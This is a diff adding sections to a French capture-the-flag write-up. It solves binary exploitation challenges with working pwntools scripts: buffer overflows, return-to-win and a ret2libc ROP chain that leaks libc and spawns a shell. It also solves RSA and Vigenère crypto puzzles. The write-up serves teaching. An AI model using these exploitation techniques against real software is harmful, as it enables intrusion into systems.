@@ -22,14 +22,11 @@ Voici la liste des challenges PWN qui ont été release :
 - isSet2
 - ASLR
 - JumpMe
-- Baby_Bof
+- Baby_BoF
 
 ### Attention !
 
-    Il s’agit d’un writeup, je ne tiens pas à faire un cours sur le PWN parce que je considère que c’est la compétence
-    avec le plus de barrière à l’entrée parmi les types de challenges du format JEOPARDY, il se peut donc que certaines 
-    notions vous paraissent flou si vous n’avez pas le minimum requis. 
-    Si je devais expliquez chaque notion, je pense que j’écrirai un article de plusieurs pages et non un write-up.
+    Il s’agit d’un writeup, je ne tiens pas à faire un cours sur le PWN parce que je considère que c’est la compétence avec le plus de barrière à l’entrée parmi les types de challenges du format JEOPARDY, il se peut donc que certaines notions vous paraissent flou si vous n’avez pas le minimum requis. Si je devais expliquez chaque notion, je pense que j’écrirai un article de plusieurs pages et non un write-up.
 
 Malheureusement toutes les instances ont été stoppés, donc les challenges seront résolus en local.
 
@@ -214,11 +211,390 @@ target.interactive()
 
 ```
 
+#### isSet2 [ First Blood 🩸] :
+
+Si vous avez compris la résolution du challenge précedent, celui-ci devrait vous semblez facile ! Je vous invite à relire le writep précedent pour plus de compréhension
+
+Une fois, le fichier du challenge télechargé, on éxécute les commandes basiques comme d'habitude :
+
+<img src="images/isSet2-file.png" >
+
+Encore une fois : 
+- Il s'agit d'un `ELF 64 bits` ce qui influence la taille des adresses et le type d'instructions utilisées
+- `dynamically linked` comme dit précedemment, le programme utilise des bibliothèques dynamiques, qui ne sont pas intégrées dans le binaire mais chargées lors de son exécution
+- `not stipped`, en gros le binaire contient des symboles de débogage et des informations sur les fonctions et variables (par exemple, les noms de fonctions) ce qui facilite grandement son analyse !
+
+
+Executons le fichier pour voir comment il fonctionne :
+
+<img src="images/isSet2-execution.png" >
+
+Allons décompilons le binaire avec notre fameux logiciel `Ghidra` comme dans le writeup précedent, voyons de plus pès la fonction main :
+
+```c
+undefined8 main(void)
+
+{
+  char local_438 [1056];
+  long local_18;
+  long local_10;
+  
+  local_10 = 0;
+  local_18 = 0x6465616463306465;
+  printf(&DAT_0010204c);
+  gets(local_438);
+  if ((local_10 == 0x6465616462656566) && (local_18 != 0)) {
+    win();
+  }
+  else {
+    printf("Pas de chance ! isset = 0x%lx\n",local_10);
+  }
+  return 0;
+}
+
+```
+
+Que fait le code ?
+
+- Déclare un ensemble de variables dont le buffer `local_438` qui a une taille de `1056`
+- Nous affiche du texte avec `printf`
+- Récupère l'entrée de l'utilisateur avec `gets` mais sans limitation ce qui cause quoi ???? Voilà, vous avez trouvez, un `buffer overflow`
+- Ensuite nous avons une condition `if` qui est vérifie si `loacal_10` est égale à la valeur `0x6465616462656566` et que `local_18` est différent de 0.
+- Si le checking est valide, alors on accède à la fonction `win()`. Que contient cette fonction ? Vérifiez avec `Ghidra`
+
+  ```c
+  void win(void)
+
+  {
+    puts(&DAT_00102008);
+    system("/usr/bin/cat flag.txt");
+    return;
+  }
+  ```
+  Elle lit le flag pour nous ! C'est donc notre objectf, atteindre cette fonction !
+
+Par défaut nous savons avec le programme que `local_10` est initialisé à 0 dès le début du programe (`local_10 = 0;`) et que `local_10` quand à lui est initialisé à `0x6465616463306465` (`local_18 = 0x6465616463306465;`). 
+
+Donc avec ceci seul une des conditions de la condition `if` est respecté, c'est à dire `local_18` différent de 0. Il faut maintenant que la variable `local_10` soit égale à `0x6465616462656566`.
+
+Pour le faire nous allons procédez comme précedement, trouvez l'offset qui sépare `local_438` et `local_10` pour ensuite écrire la valeur voulue. (Exactement la meme méthode que le challenge `isSet`)
+
+Ouvrons donc Ghidra pour calculer l'offset :
+
+<img src="images/isSet2-offset.png" >
+
+Il suffit de faire la différence entre `0x10` et `0x3f8`. Ce qui donne : 
+- `0x438` - `0x10` = `1064`
+
+Il faudra donc entrer `1064` fois le caractères `A` pour atteindre `local_10`. Une fois, il suffira d'entrer maintenant la valeur que l'on veut pour `local_10`. Dans notre cas cette valeur sera : `0x6465616462656566`.
+
+```bash
+┌──(en2eavor㉿en2eavor)-[/media/en2eavor/50c28130-290e-4b6e-897d-1e989bf6a7b6/nationalCTF]
+└─$ python -c 'print("A"*1064 + "\x66\x65\x65\x62\x64\x61\x65\x64")' | ./isSet2 
+Entrez une chaîne : Bravo ! Vous avez appelé la fonction win() !
+FLAG{********FLAG-REDACTED********}
+```
+#### Baby_BoF [ First Blood 🩸] :
+
+```python
+from pwn import *
+
+
+#target = remote("playground.ctf.tg", 1003)
+target = process("Baby")
+
+offset = 76
+target.recvuntil(b"something: ")
+
+payload =  b"A"*offset
+payload += p64(0xdeadbeef) # value to overwrite
+
+target.sendline(payload)
+
+target.interactive()
+```
+
+Execution du script :
+
+```bash
+┌──(pwn_tools)─(en2eavor㉿en2eavor)-[/media/en2eavor/50c28130-290e-4b6e-897d-1e989bf6a7b6/nationalCTF]
+└─$ python3 baby.py
+[+] Starting local process './Baby': pid 14772
+[*] Switching to interactive mode
+
+you have correctly got the variable to the right value
+
+Output: FLAG{********FLAG-REDACTED********}
+```
+
+#### JumpMe [ First Blood 🩸] :
+
+Le seul à avoir résolu ce challenge !
+
+
+```python
+from pwn import *
+
+
+target = process("./jump")
+
+offset = 136
+target.recvuntil(b"to go:")
+
+ret = 0x000000000040101a # ret;
+win = 0x00000000004011d6 # win address;
+
+payload = b"A"*offset
+payload += p64(ret)
+payload += p64(win)
+
+target.sendline(payload)
+target.interactive()
+
+```
+
+Nous exécutons le script de résolution comme ceci :
+
+```bash
+┌──(pwn_tools)─(en2eavor㉿en2eavor)-[/media/en2eavor/50c28130-290e-4b6e-897d-1e989bf6a7b6/nationalCTF]
+└─$ python3 jump.py
+[+] Starting local process './jump': pid 14566
+[*] Switching to interactive mode
+ 
+Here is your flag: FLAG{********FLAG-REDACTED********}
+[*] Got EOF while reading in interactive
+$ 
+```
+
+
+#### ASLR [ First Blood 🩸] :
+
+Ce challenge, j'ai été le seul à le solve, Le nom du challenge indique une protection assez connu dans le domaine du pwn que nous appelons l'ALSR. Au début du writeup, je vous ais parlé de certaines `mitigations` mis en place pour empecher l'exploitation des binaires.
+En randomisant l'emplacement des segments de mémoire (comme la pile, le tas, les bibliothèques partagées, et les exécutables) à chaque exécution d'un programme, l'ASLR empêche un attaquant de prédire où se trouvent ces segments en mémoire.
+
+```python
+
+from pwn import *
+
+target = process('./aslr_patched')
+elf = context.binary = ELF('./aslr_patched', checksec=False)
+libc = elf.libc
+
+target.recvuntil(b"story!?")
+
+offset = 264
+pop_rdi = 0x000000000040125b # pop rdi; ret; 
+ret = 0x0000000000401016 # ret; 
+
+payload = b"A"*offset
+payload += p64(pop_rdi)
+payload += p64(elf.got['puts'])
+payload += p64(elf.plt['puts'])
+payload += p64(elf.sym['main'])
+
+
+target.sendline(payload)
+
+target.recvline()
+target.recvline()
+target.recvline()
+target.recvline()
+
+leak = unpack(target.recvline()[:6].ljust(8, b'\x00'))
+info("Libc leak address : %#x", leak)
+libc.address = leak - libc.sym['puts']
+info("Libc base address : %#x", libc.address)
+
+
+sh = next(libc.search(b'/bin/sh\x00'))
+system = libc.sym['system']
+
+payload = b"A"*offset
+payload += p64(pop_rdi)
+payload += p64(sh)
+payload += p64(ret)
+payload += p64(system)
+
+
+target.sendline(payload)
+
+target.interactive()
+
+```
+
+Une éxécution du script nous donne un shell !
+
+```bash
+┌──(pwn_tools)─(en2eavor㉿en2eavor)-[/media/en2eavor/50c28130-290e-4b6e-897d-1e989bf6a7b6/nationalCTF]
+└─$ python3 alsr.py
+[+] Starting local process './aslr_patched': pid 14645
+[*] '/media/en2eavor/50c28130-290e-4b6e-897d-1e989bf6a7b6/nationalCTF/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[*] Libc leak address : 0x7f059d080ed0
+[*] Libc base address : 0x7f059d000000
+[*] Switching to interactive mode
+Hey, Tell me a story!?
+
+The story says 
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaac[\x12@
+$ whoami
+en2eavor
+$  
+```
+
+Une image de quand j'avais pwn le chall lors de la compétition :
+
+<img src="images/ASLR.png" >
 
 
 
+#### CRYPTO
+- Encryptionvi
+- RSAvi
+- CribDrag
+
+#### Encryptionvi [ Second Solve ]
+
+Ce challenge met à notre disposition deux fichiers :
+- key-file.txt
+- cipher-file.txt
+
+Le contenu u fichier key-file.txt est :
+
+```
+n = 1000000016000000063 
+e = 23
+c = 471055156725181012
+```
+
+On voit bien que c'est du RSA, une petite décryption rapide avec l'outil `dcode` nous donne :
+
+<img src="images/encryptionvi1.png" >
+
+Le résultat n'est pas très bien imprimable en caractères ASCII, je choisis donc l'option `Texte clair (Nombre entier)` de `dcode`
+
+<img src="images/encryptionvi2.png" >
+
+Pour l'instant je décide donc de me concentrer sur le fichier d'encryption suivant :
+
+```
+JJFEMRKNKJFU4S2KIZLEKUZSJNEVUTCGJNKVUU2KJZCVMVKTGJLEOSSLKZKVKMSIJJFEIRKLKZFVIR2KJNKVKUSTJRFVUS2WJNGVGTKJGVGEKR2WKNGEUWSCKZCVEMSLJFJEGVSLKRJUYSSSIZLEKUJSK5FE4R2WI5KEWS2LJJCEKS2TJNJUUTSHIVLVOU2HJNNEIVSHKMZFASSGJJCUOVSTKBFVUQSWJFJVGU2JLJGEKS2VJJJUWNKGIVGVGS2VJFLEUVKXKNJUQS22IRKUWUZSKRFE4SSVKVKFGSKJKZGFMS2VGJEEUTSOIVGVMU2IJJLEUVSBKNJUOSSKINLE6VSTKRFEERSWJVJVGV2KIZFFMR2UGJFEYSSHIVFU2U2WJNHEGRKXK5JUKS22INLEKTKTLBFEKMSVK5JEWSCLJVNEKV2UINFUSTSDKVLVKWSTJNJEIVKVKNJVMS2WJNDEOU2DJJFVUR2GJVJUWVCMJJFFKVKSKNHUSVSEKZGVKMSJJJFEYRKVKZJUES2OJJKU6U2TINEU4S2VGZLFGVCLKJDFKRKSKNLUWVSJKZDVMMSLJFNEMRSLKYZFIR2KIZCVSU2TJBEVMRSVGJKTEV2JGVDEKV2SJNMEUWSGKVHVGS2WI5FEIRKPKZFFGS22IZCU2VCDIZGEMTCGI5JUGTCKKZHEKS2XJNKEWTSGKVJVIU2EJNLEYVSLK5JVISSOJRCUSVSLKZFU4SSWJVJVUVSKJJGEKT2WINGEUUSGKZKVEMSHJJLEWRKXKZBU2SSKIZDEWVSLKNFU4R2VKNLFGRKLLJDVMS2NKNHEUSSIIVDVMU2WJNFEUVSBKMZE6SSKJNKU6VJSKRFDKRSFGRITEVKJKZGEMR2WINFEUWSEIZFU4Q2TJNHEYRKTKZJUWSK2IRLEKUZSJRFEUTSFJVJFGTCLJFNEMT2TGJHUSVSLKZHVMU2LJNJEKVSVKJFVMR2KJNKEKVKTJNFEUQ2WJFJEWV2KJZFEKV2XKNDUSUSGKZDVCMSXJE2U4RKXKJBUMS2WIJKVOURSKZEFKNSUGJIEUNKIKU6T2PJ5HU6Q====
+```
+
+Avec l'outil cyberchef, je constate que le message a été plusieurs fois encodé en Base32, une fois décodé, j'obtiens ceci :
+```
+UCVP{ORTI_MZPH_LNEBCSAIQXZL_SA}
+```
+
+Au final j'ai donc :
+
+```
+UCVP{ORTI_MZPH_LNEBCSAIQXZL_SA}
+```
+et ceci,
+```
+104097099107101100
+```
+
+La première encryption me fait pensé au ROT, mais rien. Vu que j'ai une seconde clé, je pense au `XOR` et à `Vigenère`.
+
+Toujours rien, mais en me penchant sur le vigénère, je sais que généralement la clé est généralement une suite de lettre. Et si, le `104097099107101100` était une forme d'encryption. J'utilise donc `dcode`, l'option, `reconnaitre un chiffrement`.
+
+<img src="images/encryptionvi3.png" >
+
+Il me propose de l'ASCII
+
+<img src="images/encryptionvi4.png" >
+
+Bingo ! J'ai le mot `hacked`
+Essayons alors avec Vigenere :
+
+<img src="images/encryptionvi5.png" >
+
+Un sacré vénare le concepteur du challenge !
 
 
+On obtient donc le flag : 
+
+```
+Flag : NCTF{KOMI_KPLE_ENCRYPTIONVI_LA}
+```
 
 
+#### RSAvi [ Second Solve ]
 
+Nous avons un fichier `RSAvi-pub-key.txt` mis à notre disposition dont le contenu est :
+
+```
+n: 5028492424316659784848610571868499830635784588253436599431884204425304126574506051458282629520844349077718907065343861952658055912723193332988900049704385076586516440137002407618568563003151764276775720948938528351773075093802636408325577864234115127871390168096496816499360494036227508350983216047669122408034583867561383118909895952974973292619495653073541886055538702432092425858482003930575665792421982301721054750712657799039327522613062264704797422340254020326514065801221180376851065029216809710795296030568379075073865984532498070572310229403940699763425130520414160563102491810814915288755251220179858773367510455580835421154668619370583787024315600566549750956030977653030065606416521363336014610142446739352985652335981500656145027999377047563266566792989553932335258615049158885853966867137798471757467768769820421797075336546511982769835420524203920252434351263053140580327108189404503020910499228438500946012560331269890809392427093030932508389051070445428793625564099729529982492671019322403728879286539821165627370580739998221464217677185178817064155665872550466352067822943073454133105879256544996546945106521271564937390984619840428052621074566596529317714264401833493628083147272364024196348602285804117877
+e: 65537
+c: 910608573637151766592741646359139555904784321803428631903908521552777131951859943264846191932402055361498833375383031229982671149184931476945992913466889183135416918539956961820558514150083912697984734926228428443118777138784611695369848396345996684825978811495769794000028162328296106538834105679041143112167457232598415865376387117363685043296310893895276246811763099409354508200573619390090997964746798565329562050838200030630642311614753187518105030421307242611249224367001150700929649005704167426797306122940084457886648912809477865187453480840066041235665224721513474626323469389328348619076314546500324660002098406857368395712006506085979376605570852002827440581870285648568821111126184732646412744560252339729285745684255300564198233245551795520488002246541148191891638167766174343956597790791412271287103435898656125200311034726689604250470550962999602813441700239313471735088686090118193986040812649177699990431175510727928479609056957499981828555298181509942252598922669324311388997980627956686857171713789243776386582830964685489639326163726989990782553883048442851867799363438923802846660160105009546625127827041093314684740004973510575753396968680745019510035997596458456708393142128304479225924812035886211226
+```
+
+On remarque déjà qu'il s'agit de RSA, mais ici le problème c'est que `n` est trop grand, donc nous devons penser à le factoriser pour trouver `p` et `q`. Je vous conseille de lire un peu plus le fonctionnment de `RSA`.
+
+Pour la factorisation, nous utiliserons le site de `factordb` :
+
+<img src="images/RSAvi1.png" >
+
+Voici le résultat :
+
+<img src="images/RSAvi2.png" >
+
+On peut voir ici que le site factordb, nous sort une liste de produits de facteurs premiers ( 64 en tout ! ). J'ai été vraiment coincé sur ce problème, mais après de nombreuses recherches, je me rends compte qu'il s'agit d'une vulnérabilité de RSA bien connue : 
+```
+L'algorithme RSA peut avoir plusieurs nombres premiers, mais cela affaiblit l'algorithme parce qu'ils peuvent être factorisés facilement !
+```
+
+Je tombe sur ce writeup avec un script assez compréhensif : 
+
+<a href="https://github.com/Re-Adventures/CTF-Writeups/tree/master/RedPwn2020/4k-rsa"> Disponible ici  : Re-Adventures - RedPwn2020/4k-rsa </a>
+
+Il suffit fonc de remplacer nos valeurs et Bingo !!
+
+```python
+def inverse(x, m):
+  a, b, u = 0, m, 1
+  while x > 0:
+    q = b // x
+    x, a, b, u = b % x, u, x, a - q * u
+  if b == 1:
+    return a % m
+n = 5028492424316659784848610571868499830635784588253436599431884204425304126574506051458282629520844349077718907065343861952658055912723193332988900049704385076586516440137002407618568563003151764276775720948938528351773075093802636408325577864234115127871390168096496816499360494036227508350983216047669122408034583867561383118909895952974973292619495653073541886055538702432092425858482003930575665792421982301721054750712657799039327522613062264704797422340254020326514065801221180376851065029216809710795296030568379075073865984532498070572310229403940699763425130520414160563102491810814915288755251220179858773367510455580835421154668619370583787024315600566549750956030977653030065606416521363336014610142446739352985652335981500656145027999377047563266566792989553932335258615049158885853966867137798471757467768769820421797075336546511982769835420524203920252434351263053140580327108189404503020910499228438500946012560331269890809392427093030932508389051070445428793625564099729529982492671019322403728879286539821165627370580739998221464217677185178817064155665872550466352067822943073454133105879256544996546945106521271564937390984619840428052621074566596529317714264401833493628083147272364024196348602285804117877
+c =  910608573637151766592741646359139555904784321803428631903908521552777131951859943264846191932402055361498833375383031229982671149184931476945992913466889183135416918539956961820558514150083912697984734926228428443118777138784611695369848396345996684825978811495769794000028162328296106538834105679041143112167457232598415865376387117363685043296310893895276246811763099409354508200573619390090997964746798565329562050838200030630642311614753187518105030421307242611249224367001150700929649005704167426797306122940084457886648912809477865187453480840066041235665224721513474626323469389328348619076314546500324660002098406857368395712006506085979376605570852002827440581870285648568821111126184732646412744560252339729285745684255300564198233245551795520488002246541148191891638167766174343956597790791412271287103435898656125200311034726689604250470550962999602813441700239313471735088686090118193986040812649177699990431175510727928479609056957499981828555298181509942252598922669324311388997980627956686857171713789243776386582830964685489639326163726989990782553883048442851867799363438923802846660160105009546625127827041093314684740004973510575753396968680745019510035997596458456708393142128304479225924812035886211226
+e = 65537
+
+factors = ['9353689450544968301', '9431486459129385713', '9563871376496945939', '9734621099746950389', '9736426554597289187', '10035211751896066517', '10040518276351167659', '10181432127731860643', '10207091564737615283', '10435329529687076341', '10498390163702844413', '10795203922067072869', '11172074163972443279', '11177660664692929397', '11485099149552071347', '11616532426455948319', '11964233629849590781', '11992188644420662609', '12084363952563914161', '12264277362666379411', '12284357139600907033', '12726850839407946047', '13115347801685269351', '13330028326583914849', '13447718068162387333', '13554661643603143669', '13558122110214876367', '13579057804448354623', '13716062103239551021', '13789440402687036193', '13856162412093479449', '13857614679626144761', '14296909550165083981', '14302754311314161101', '14636284106789671351', '14764546515788021591', '14893589315557698913', '15067220807972526163', '15241351646164982941', '15407706505172751449', '15524931816063806341', '15525253577632484267', '15549005882626828981', '15687871802768704433', '15720375559558820789', '15734713257994215871', '15742065469952258753', '15861836139507191959', '16136191597900016651', '16154675571631982029', '16175693991682950929', '16418126406213832189', '16568399117655835211', '16618761350345493811', '16663643217910267123', '16750888032920189263', '16796967566363355967', '16842398522466619901', '17472599467110501143', '17616950931512191043', '17825248785173311981', '18268960885156297373', '18311624754015021467', '18415126952549973977']
+phi = 1
+for p in factors:
+  p = int(p)
+  phi *= (p - 1)
+
+d = inverse(e, phi)
+M = bytes.fromhex(hex(pow(c, d,n))[2:]).decode()
+print(M)
+```
+
+```
+┌──(pwn_tools)─(en2eavor㉿en2eavor)-[/media/en2eavor/50c28130-290e-4b6e-897d-1e989bf6a7b6/nationalCTF]
+└─$ python3 RSAvi.py                                                          
+NCTF{DegnigbaN_f3_RSAvi_Yelo}
+```
+
+```
+Flag : NCTF{DegnigbaN_f3_RSAvi_Yelo}
+```
+
+#### CribDrag [ First Blood 🩸]
+
+Malheuresement, je n'ai plus les files du challenge, mais il s'agit d'un challenge CribDrag assez classique. Faites vos recherches dessus !
+
+L'outil utilisé porte le meme nom : `cribdrag`
+
+<img src="images/cribdrag.png" >
+
+Quand bien meme, voici un screenshot de quand j'ai résolu le challenge !
